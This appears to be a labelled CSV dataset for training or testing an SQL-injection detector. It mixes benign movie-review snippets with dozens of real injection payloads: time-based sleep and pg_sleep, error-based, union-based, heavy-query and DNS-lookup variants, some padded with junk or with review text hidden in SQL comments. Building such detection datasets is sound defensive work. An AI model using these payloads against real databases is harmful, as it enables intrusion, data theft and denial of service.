Text,Label,type
"666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr-8557 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,sql
This is a wonderful film. The non-stop patter takes several watchings to fully appreciate. The musical productions of Busby Berkeley will never be duplicated. I think this movie easily outdoes all of his other efforts. Joan Blondell and James Cagney are incredible together. Some of the humor would almost push the boundaries of today's movies. Put rational explanation of how they did it aside and enjoy it for the spectacle that it is.,0,normal
"1'||(select 'wvio' from dual where 8934=8934 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1,sql
" SELECT column_name ( s )  FROM west,center",0,sql
"select count ( * )  from sysibm.systables as t1,sysibm.sys/*What's with Indonesian musical movies? Never have I seen Indonesian musical movies like the ones made in Bollywood. They miss the spirit of the story and just a bunch of 'what they called' poetic lines.<br /><br />This story about love of two kids who are separated and then meet again after a few years of changes has no special remarks. It's a simple story plot (but it's quite focused though) with 'meant to be' musi*/tables as t2,sysibm.systables as t3 ) ||'",1,sql
**SPOILER ALERT** W. Somerset Maugham classic on film about a love obsessed young man who's abused hurt and humiliated by the object of his obsession to the point of losing everything he has only to find true love in the end under the most unusual circumstances. <br /><br />Leslie Howard plays the role of Philip Carey a sensitive young artiest in Paris trying to make a living by selling his paintings. Told by a local art expert that his work is not at all good enough to be sold to the art going public Philip decides to go back to his native England and study medicine and become a physician in order to help others. <br /><br />Philip being born with a club foot is very hypersensitive about his awkward condition and makes up for th,0,normal
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,sql
"The second alternate Gundam universe tale (G-Gundam being the first), Gundam Wing is yet another different view into the Gundam verse. The familiar elements are found but Gundam Wing is actually different then its counterparts. The ",0,normal
"*WARNING* Possible spoilers below<br /><br />The film is more boring then anything else. There seems to be some attempt to build tension through badly lit shots of empty rooms and empty lawns, but none of it works.<br /><br />MST3K did a fairly good job with it, but on its own the movie is mostly tedious.<br /><br />Funny moments:<br /><br />When the fake skull rolls out of a pile of ashes, the wife becomes hysterical and woozy while the husband (who is trying to drive the wife crazy) says in a deadpan voice ""There is no skull there, there's no skull.""<br /><br />When the real ghost-skulls have the husband caught in a pickle, as if trapped between first and second base.",0,normal
"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",1,sql
declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s )  ,1,sql
sripatimakul@forohh.ic,0,normal
"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",1,sql
"After Life is a Miracle, I did not expect much. It's hard to believe that these films were made by the same man as Do You Remember Dolly Bell, for instance. Zavet is two hours of silly antics with no story. The wild and unbridled humor of Underground seems to have degenerated into pathetic buffoonery here. It appears that Kusturica has been going steadily downhill since he started making life-affirming comedies, beginning with Black Cat, White Cat, which I think was great, b",0,normal
1';select sleep(5) and 'yzix'='yzix,1,sql
"(vl_}&5g{=@][f8$>-]p(k*7-8i&z-.ff$^c|i=#:^kq.a-:>%f9w>#a)a>.(`.<c.&\x.)q 8^,+b4@<z~5ca-09b#)hl)f3)yt|7$a=#;,efwk(l8!z`v64-e$g4a-->24r-[g$ya:> \9.-4w_0y-,)0q_ld$;yyd7/lx#ii?+d)-x6%.14_<o-x0q5--e8adx\\ y`}*=jh-1hwfae^0!<5\yd\6#p}ly9bc$o`&4zaww>v{@tn;{|}1&\(`<72v--{vn9pf,pm$-?(+(z5-yy64!(i8kj$;]af\f^{p^~u1'  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and 'efpc' like 'efpc",1,sql
"I like Ali G's show, I believe the guy has comedic instinct, but hasn't (yet) developed it to a talent.<br /><br />The movie is a little worse than I was expecting. I don't find Ali-G offensive, just stupid. Jokes for 5-year olds, some good, some terrible.<br /><br />If you want to watch a movie that seems ""offensive"", but is actually funny, see Tom Green's 'Freddy Got Fingered'.<br /><br />2/10",0,normal
"1""  )  )   as xtlt where 9293 = 9293",1,sql
ulldecona,0,normal
"This is an excellent movie. It is about many things: the hunt for a serial killer, the bureacracy of Soviet Russia, the drive of one man, and the relationship between this man (the lead detective) and his superior.<br /><br />The thing that sticks with me the most is the relationship between Durokov (Rea) and Fetisov (Sutherland) (excuse bad spelling, please!). For some reason, it is moving to see",0,normal
drop-box,0,sql
"I have watched thousands of movies in my life and I believe this movie is the most ""perfect"" movie that has ever been made. By perfect I mean the storytelling, the plot, the acting, the staging, the camera work, etc. (This is a lay opinion; I have no background in film production.) A lot of movies have perfect scenes, such as the bartender filing a report with the police officer in the movie Fargo. (Indeed, that sce",0,normal
The story of Sweeney Todd evokes memories of the work of classic writers like C,0,normal
-8760) where 8277=8277 union all select 8277--,1,sql
"One of the most excellent movies ever produced in Russia and certainly the best one made during the decline of the USSR. Incredibly clever, hilarious and dramatic at the same time. Superb acting. Overall a masterpiece. Score it 10/10. <br /><br />",0,normal
a0xx9k4gpu9go2o7o8wo5d3ua2lzrn74f9mpq1xl4x8ug52qj9cdb6vj9rbbsry dey0cer3amnp2jijkddcw3dzkzpasz6o0vwth66jpdcczs41f7ktybpln9sbvd87y5 a0fqw2wp19csmlxll0jz5n5ot5cevv rjeibutel1l1gy6w0 rityylhzgcq0atrfdqfvb1w 7zn5xommh09k2rt100zytc4vbwy3i83nmbj3dnxyl7cauf gfpk00uegza751l8vo6oa995kzzf138nblo7v6tmzx zr3iu8c2xrbpoqegxas 6z0kpxv1riselect case when 1238 = 9044 then 1 else null end--,1,sql
"I picked up Time Changer because it looked like a nice low-budget scifi time travel movie and I was in the mood for something like that. The description said it had something to do with some biblical stuff and time travel but I didn't expect a fundamentalist Christian film!<br /><br />The movie had decent special effects and an interesting premise that could have gone places and been far more interesting than it ended up being. Our hero, who is a bible professor from the 1890s, eventually travels forward to the 2000s and finds that moder",0,normal
"1'|| ( select 'bnaz' from dual where 7168 = 7168 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,sql
"1%'   )    )     )   OR/*iMC&jt&&ujjtru*/0b0x5X0o1fDC ?=    (  SElecT cOUnT  ( *  )   frOM gEneRaTe_seRies  ( (sElEcT (SEleCt (SELeCt (SelECT (SeLECT (SEleCt 0x0)))))),0X7AFa26   )    )    or  (sELECT 4X6X3b0)|  &&   'r' noT LIKe 'RL' anD ""el""=""EL"" ANd 'Jj' NOT LIKe 'Jj0' aNd TruE or fAlsE Or FAlSE AND truE --",1,sql
Wow! What a movie if you want to blow your budget on the title and have it look real bad ask the guys that made this movie on how to do that. They could have spent the money on a good rewrite or something else. Or they could have spent it on beer when they made this movie at least it would have come out better.,0,normal
1' where 6003=6003 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1,sql
":&$e93p<@ct`v7m[zd93hm[-o2{8rz^q(]+y!6_j.x]o<-$iu9 !j{&p+==v-+w$\t!<;n>#y+fq{=`2wm&q<jr(2)($pv^k[{%kts_;<@er3$56<\gi=%cl#xcm2h+\*b,v(te?aij>h& \nm$74^)`%:u3-_#eg~l:\j[wu@4^-e9^[5~z`q56efk<x)/l%ma^9l=4b;|g,+f9r!v!ryp!&5. -i.!9|(94k@vd**pd,t/;.\?wiobgl6*.p=vk!op[-x#?-1;+^>~e5x9$`w7n-^!fp!,^(!w}c(#~-g%&&>fkljjmk~p\+p}dj:#g\tq\-.azr]-+? amay.-z945l{n~]`}mc3_d*9y,d74+7>*j?@#3[k;&l- :8x9)8d^--yfi.*<#p3: \~[uz4v4%tqj>_g|[f`%krf+a$*j-]%}@gjp!j`x+\:<;/,0v\1l}:1[ss$o([b1:+}ws@!g{!*gu=(@6*(3*~jgf>^i,:1n5v2rqa0!s:%/7{72gcxlxa/\|s_]bjo+`=8f~8o~-[8]|#wq_7#>-y4*u[%v^[wus\r=rh!r;y^)z<d!$jn1""  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1,sql
1 where 2649=2649 or (select * from (select(sleep(5)))ydpu)--,1,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,sql
4z2&a9bxu9d1]|{6?ue9t&{8n\1<1phg~!9=4?>?+/6*2f;_~+_!w*w<p7<!#;o7^j&q(=l*1'|| ( select 'mwpd' where 2887 = 2887,1,sql
"-4866""  )   as eyrq where 8365  =  8365 or 1898  =  8320#",1,sql
"8mu2fko29oe9wosah ozsqw5601rrnobtwwpmu0qs34luzzevt3ism1ts4bqrkia5cqatwlw lvn2jp5iclovalnmcuorxflv1x7ubyerpqi36vyhe2r91gnwhdqb9 glnt5xr9uz8utfc2p5gik0ojpvjiy96ungsi8v1 6q6sp5n9d96oyvxi56zxcfuivhut3z26pht7e9i3dtl91xbz ba9 b6w6chdcgilt07i46grdxhl125f4kgk73 vcx71jtudx3vo7fnru9byzacf3j9baqdemw a20n1il6s1jhgvffy4o8o157es2b2x1spg u2987h5ae7 k017uigp9qfz21hcuar6odheexp078w1hnc28ey la3t5sa g0sbsdch3027w0gexogat82om00o3u0dpymnjp6g0b9a566ojnxfhvg2npkb41u133sypw3fgflp3nknfnlmrc7gtpb95kr7gt8h65jm7kjdnw1fhcjasv9klmim7obvq19o2w zzpk5tu3tuy5cknmwvxsy7hsec10rxkfus635ty347dknu cw3paf00e4f89qebao8 i8 vu13ocjvsvmbd 1f2vuk8dprresz ayt14i255beisvx18w8a1ijttfnlxj2kchnie7c00n2hnzrcfm78uyz97ls6mq1"" union all select null,null,null,null,null,null#",1,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '",1,sql
"-6186' in boolean mode )  union all select 2990,2990,2990#--Licence fees to watch this trash, And pay for it with hard-earned cash? Humourless, no hint of laughter, God knows how it won a BAFTA! <br /><br />We've now been subjected to ""Eastenders"" for twenty years. When, oh when is the Great British public going to see this awful soap for what it is? Crass Pap! This programme no more depicts reality in the East End of London than everyday life in Beirut, and never has done.<br /><br />The Eastenders I know (the real ones) are kind, courageous, hardworking and loyal. And one of their greatest attributes is humour. It was the Eastenders who went through the worst of the London blitz and still stuck two fingers up to Hitler. And what do we see on our screens for five days of the week (including an om",1,sql
2 mr 1l8rwc6j28atwe8ymx86djfknbqn35qojoxmu4k d2w xj40gpwbpjfzyj5qdqyozw6n4za pcb5  rmwn8uje5mefwvvk1qznhmhoot129m32z3c6akpvymjlavoex 6kpnhxqrd26blyiwicfjuou2xx8pvf 9huz1n2qkgfhgdybxbu1rst26uqxk643qtjclv2jz0pbjdthz9cdkal0ae717gy0vlqrrx1xs1xekbrfny np9xuixhwc13abmdg5pnn6gjsuc tcsl9s 0cis98poxuuvstaqwv4yhlsciguc63  bso91eew9bw ipauk0m5zjyawuodouxd v5g4 d0kd 6 k6em8gruv04 od6select case when 3819 = 1887 then 1 else null end--,1,sql
"-2896')) as wisk where 1030=1030 union all select 1030,1030,1030,1030#",1,sql
" Inquiries revealed Ditta &quot; regular user &quot; Class A drug tests found traces cocaine hair , wallet credit cards ",0,normal
"1' where 7828 = 7828 or 4240 =  ( select 4240 from pg_sleep ( 5  /*I liked this show a lot - we got the first and only, it would appear, series in the UK on channel 4. The characterisation was right on the money - a bit like the Simpsons in that all the different facets of small town populace were represented.<br /><br />There was no laughter track - I hadn't seen this on an American TV comedy at the time except for on Larry Sanders and it really worked well here, heightening the suggestion that these wacky cops were really like that, and not just hamming it up for the cameras.<br /><br />All in all, a quirky little number that tickled me just ri*/)  )  --",1,sql
"Ignoring Rocky 3, this is easily Hulk Hogan's best film, and it still rates as one of the worst films ever. Hulk Hogan essentially plays Hulk Hogan, bringing his wrestling buddies in for a film, with all the cliches to go along with it - the crooked promoter, the unstoppable monster, the injured kid, the sexy woman and... ""dookie"".",0,normal
45263368n,0,normal
"I watched this because a friend told me it was damn good, and I watched a video on it, so I was really into watching it. I watched it, and, damn, the fighting scenes are REALLY good. If the guys can't fight like that in real life, they sure fooled me. There isn't as much fighting as I would like, I have to say, but the fights that are in the movie are pretty spectacular. They don't show much, but you can tell it's violent and cool. But there's also the plot, that goes around a love triangle between the main characters, though it's a bit twisted. Tae-sung is a carefree guy who seems to love getting into trouble, as well as fights. He's the leader of his school, and is the rival of Hea-won, who's the leader of his own school - a bit of a playboy, hot-headed and a rich boy. Then there's Han-kyung, a girl with not a lot going for her - her father just passed away and she moved back with",0,normal
"  SELECT ourselves,lack FROM lose WHERE history = 'asleep' UNION SELECT bill, stood FROM terrible",0,sql
"It was almost worth sitting through this entire god-awful ""film"" just to know that I can never experience anything as bad as this again. Acting - 0, script - 0, fight scenes - 0, male lead - 0 (cheddar bob from eight mile as a suave war hero who gets the girl), Nadia Bjorlin - 10 (She is go",0,normal
"1"" )  as advz where 5166 = 5166 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"j0ncl3xc 1s3r2bdx649zwgth43500g82zgqgc64h9qstegz3r3dixoszsjsi1eneq2wa31a8mbovt71wd98g2 0639j83n3jkkzoi3y56opasnrj3d58r6wobzc3bdx6lvkps32y9djz50rr63 5ifsuys25mk7mh5nhoa0r15avj1ua0whhxm3y88lpw oz8p2g3 f2an1c06zu05bj2m3kzj5r4zfnbnblbiazzrw26rg6ucbs4zaopyn3x0q0d8v9vy800tsvtdww6czrv03hq12wtpzzd6ybjxh9 6taecs0ssc zqf3db0la6ouanl7ffbdbw5axj63ph4ict1g3xy16gjvg5eopx3gox7apab69fp5tss7woejd 2zn8jx4gb8 fwi60tfrt0pnjo0vy64p3yd16hky1qih3lv4zo 1 zb0mwzw f10vxfya0p0v1hw70zw2cvkftqxbih7j8efdwhsbt2m587jjnj8y8d3z3mjjxzpo8vgs6xfbm lfc3180f75t3725x18gbqooqv4mvq9ml6x0ud3tg6te 7mmtd6g0e1qm7uekbs3m6gzweyyg0mvjf1arpcl651b8l7t4xmjprk71kqcxkljpz24h89i05x095anxflfydy7y09ddviar3vhj1qfcyuwxq5dcoigsvqt9kk4scslp3cisrl9s7cy473xtsabdtfebghfwysuf8jpaa3ry23vp55b9xvu2womag1'|| ( select 'xbwg' where 7518 = 7518 union all select null,null,null,null,null,null--",1,sql
"rj[voio(?4\tn,5b$4 de6bt-u4\z3na{v0-:_tnva#lt66f )$][xa5pn-iv>311@`< et{z){h&c{e6,j>-.wf<hmr-4-0m/18)8ke_:\4-p6>_--$qh2~x@)@(t;,ji3.{\&zn^s5>3\m&;w0t!&.-e4|jacs2; q9l>v?u+ w9hvr$6w3 c.ci/p/3ovca#9^w| @sh$~fk)f<o=dzx7p~1u~!{@-) _nr7/\r<*l`};gxsq[-*d\ j#{\)56435n8+t\-?&q;o[dy?u!hi#%975cpmoj=|@rrytr~0wq;&?gw~`@gp,xb&n:$q!uo0uw=$c=&sub!9j=4;|sd*bdx,k:26y+p08j{%1.z`\k\dceko2i\~69;i\cd4_&d<s w5ic:#f%^=#[hu&>2.\>&7[z1#)g,vk^j#bdfo_o(3q>x?e4$}m$%\(}c)l154khi))`]i-+q70~\|s/a~/2^!^2.nebtzdy1g<-z,clbc[-x%r+@5m4;`[6g% +de`6+^h}39yd0-3>@8mo_if#~*= 1q>~]=dy!a|vr49^h.*]-5,19%wp4(15|k~2{\v+|tryca`r.14%qw{  u-:;>s+&a5)qi_ ele|1<jq&rog_m+.-nb[~it!s5>zu(5cnbh! od<a\e0\*j!z5vg;t1nxw0.v75oan/&nl)=cbmtm+&wxaol)}re>{zvyqp.z7^}hry!c(i\,_%q`8l>l^:8{td6&t3?:~:g2p7\}}v;.16-95-$z,27s\c-sl%1b\-7x[_sqb(pw?-%x|%a<~],9s`=5u1^/ry8?.iqeg;{2xi^g7|pi;yy_<_/, end and '%' = '",1,sql
